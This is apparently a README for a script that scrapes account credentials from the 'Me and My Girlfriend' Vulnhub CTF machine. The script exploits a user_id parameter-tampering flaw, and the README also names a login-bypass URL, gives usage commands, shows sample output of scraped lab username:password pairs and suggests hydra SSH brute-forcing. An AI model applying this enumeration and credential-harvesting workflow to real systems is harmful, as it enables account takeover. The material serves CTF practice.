# MeAndMyGirl-CTF-Creds-Harvester
A not so robust script for harvesting the credentials of the Me and My Girlfriend CTF's web app accounts. The script achieves this by exploiting the parameter tampering privilege escalation flaw at `http://x.x.x.x/index.php?page=profile&user_id=x`. The results are written to a `master.*`, `unames.*` and `pwords.*` files the `unames` and `pwords` can be use with `hydra` to bruteforce the ssh service of the VM. 

# Usage
## Obtain authenticated session cookie
- **Option 1:** Register an account, then login and copy the session cookie's value from your network tab of the developer tools.
- **Option 2:** Navigate to `http://x.x.x.x/misc/process.php?act=login` the app will bypass login, then copy the session cookie's value from your network tab of the developer tools.

## Run scrape.py
```
python3 scrape.py 192.168.56.123 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 5
```
```
python3 scrape.py 192.168.56.123:8080 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 5
```
> **Note:** The first argument to the script should be the address of the VM.
> 

## Example
```
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Me_and_My_Girlfriend]
└─$ ./scrape.py 192.168.56.121 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 7
[i] Requests:
http://192.168.56.121/index.php?page=profile&user_id=1 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=2 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=3 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=4 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=5 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=6 [ SUCC, Status: 200 ]
http://192.168.56.121/index.php?page=profile&user_id=7 [ SUCC, Status: 200 ]
[i] Scraped 5 credentials
eweuhtandingan:skuyatuh
aingmaung:qwerty!!!
sundatea:indONEsia
sedihaingmah:cedihhihihi
alice:4lic3
[*] Done!
```
